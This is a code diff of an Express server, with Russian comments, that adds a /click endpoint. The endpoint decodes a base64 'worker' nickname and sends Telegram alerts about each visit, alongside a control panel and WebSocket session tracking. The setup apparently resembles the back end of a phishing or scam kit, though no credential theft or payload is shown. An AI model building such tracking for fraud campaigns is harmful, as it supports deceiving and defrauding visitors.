@@ -18,7 +18,7 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Логирование запросов
+// Логирование запросов (без IP)
 app.use((req, res, next) => {
     console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
     next();
@@ -32,10 +32,49 @@ app.get('/panel', (req, res) => {
     res.sendFile(path.join(__dirname, 'panel.html'));
 });
 
+// --- ЭНДПОИНТ ДЛЯ УВЕДОМЛЕНИЙ О ПЕРЕХОДАХ ---
+// Вызови: GET /click?path=/some/page&sessionId=abc&referrer=base64nick
+// Этот эндпоинт НЕ собирает/не отправляет IP — только мета(время, путь, sessionId, referrer/ник)
+app.get('/click', (req, res) => {
+    try {
+        const pagePath = req.query.path || req.path || 'не указан';
+        const sessionId = req.query.sessionId || 'не указан';
+        let workerNick = 'unknown';
+        const referrer = req.query.referrer;
+
+        try {
+            if (referrer && referrer !== 'unknown') {
+                workerNick = atob(referrer);
+            }
+        } catch (e) {
+            console.error('Ошибка декодирования referrer:', e);
+        }
+
+        const timestamp = new Date().toLocaleString();
+        const message = `<b>🆕 НОВЫЙ ПЕРЕХОД</b>\n\n` +
+                        `<b>Время:</b> ${timestamp}\n` +
+                        `<b>Страница / путь:</b> <code>${pagePath}</code>\n` +
+                        `<b>SessionId:</b> <code>${sessionId}</code>\n` +
+                        `<b>Worker:</b> @${workerNick}\n`;
+
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' })
+            .then(() => {
+                res.status(200).json({ message: 'NOTIFIED' });
+            })
+            .catch(err => {
+                console.error('Ошибка отправки уведомления в Telegram:', err);
+                res.status(500).json({ message: 'ERROR', error: String(err) });
+            });
+    } catch (err) {
+        console.error('Ошибка в /click:', err);
+        res.status(500).json({ message: 'ERROR', error: String(err) });
+    }
+});
+
 // Инициализация Telegram бота
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-// Установка вебхука
+// Установка вебхука (если есть RENDER_EXTERNAL_URL)
 if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook установлен на ${WEBHOOK_URL}`))
@@ -51,19 +90,18 @@ bot.getMe()
     .then(me => console.log(`Бот запущен: @${me.username}`))
     .catch(err => console.error('Ошибка инициализации бота:', err));
 
-// Обработка входящих обновлений от Telegram
+// Обработка входящих обновлений от Telegram (если вебхук используется)
 app.post(webhookPath, (req, res) => {
     bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
-// Инициализация WebSocket сервера
+// --- ИНИЦИАЛИЗАЦИЯ WEBSOCKET ---
 const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
 const clients = new Map();
 const sessions = new Map();
 
-// Обработка WebSocket-соединений
 wss.on('connection', (ws) => {
     console.log('Клиент подключился по WebSocket');
     ws.on('message', (message) => {
